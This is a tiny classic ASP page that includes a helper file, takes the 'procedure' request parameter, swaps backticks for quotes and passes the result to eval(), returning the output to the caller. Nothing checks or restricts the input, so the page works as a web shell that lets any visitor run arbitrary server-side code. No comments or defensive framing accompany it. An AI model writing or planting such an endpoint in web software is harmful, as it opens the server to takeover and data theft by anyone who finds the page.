<!--#include file="aspfunctions.asp"-->
<%
	dim procedure,ret
	procedure=request("procedure")
	procedure=replace(procedure,"`","""")
	response.Clear()
	ret=eval(procedure)
	response.Write(ret)
%>